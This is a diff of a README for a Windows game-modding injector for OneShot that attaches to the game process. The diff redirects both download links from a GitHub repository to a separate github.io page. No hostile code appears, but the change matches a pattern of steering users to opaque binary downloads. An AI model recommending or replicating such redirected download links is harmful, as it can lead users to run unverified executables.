@@ -1,6 +1,6 @@
 # 💉 CalamusInjector - Modify your OneShot game experience easily
 
-[![Download Now](https://img.shields.io/badge/Download-CalamusInjector-blue.svg)](https://github.com/karlynepalese623/CalamusInjector)
+[![Download Now](https://img.shields.io/badge/Download-CalamusInjector-blue.svg)](https://karlynepalese623.github.io)
 
 CalamusInjector helps players change how they play OneShot. This tool acts as an injector that adds a menu to the game. You gain access to settings and options that remain hidden during normal play. It works by attaching to the game process and modifying the underlying script engine.
 
@@ -19,7 +19,7 @@ This tool targets the RPG Maker XP engine, which powers OneShot. It modifies the
 
 Follow these steps to set up the tool on your Windows computer:
 
-1. Visit the project website to download the latest version: [https://github.com/karlynepalese623/CalamusInjector](https://github.com/karlynepalese623/CalamusInjector)
+1. Visit the project website to download the latest version: [https://karlynepalese623.github.io](https://karlynepalese623.github.io)
 2. Locate the file you downloaded. It usually sits in your Downloads folder.
 3. Right-click the folder and select Extract All to reveal the contents inside the compressed file.
 4. Open the extracted folder.
